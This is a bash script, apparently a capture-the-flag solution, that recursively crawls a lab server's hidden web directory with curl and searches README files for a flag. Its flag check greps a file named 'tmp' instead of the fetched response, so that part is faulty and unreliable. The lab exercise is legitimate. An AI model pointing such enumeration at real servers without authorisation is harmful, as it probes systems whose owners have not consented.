#!/bin/bash

keyword="flag"
regex="href=\"[A-z]*"
baseUrl="http://10.11.200.193/.hidden/"
flag=""

total=18279
current=0

searchFlag() {
    local url=$(echo "$1")

    if [ ! -z "$flag" -a "$flag" != " " ]; then
        return
    fi

    local response=$(curl -s $url)

    # TEST IF FLAG IS HERE
    if [ "$2" == 1 ]; then
        local tmp=$(echo $response | grep -E "[0-9]+" tmp)

        if [ ! -z "$tmp" ]; then
            flag=$(echo $tmp)
            return
        fi
    fi

    local array=($( echo $response | grep -o "$regex" | sed "s/href=\"//" | awk 'NF'))

    for i in "${array[@]}"
    do
        # echo $i
        if [ "$i" != "" -a "$i" != "README" ]; then
            searchFlag "$url$i/"
        elif [ "$i" != "" -a "$i" == "README" ]; then
            searchFlag "$url$i" 1
            current=$((current+1))
            echo -ne "Current progress : $(((current * 100) / total))%\r"
        fi
    done

}


searchFlag $baseUrl
echo "THE FLAG IS : $flag"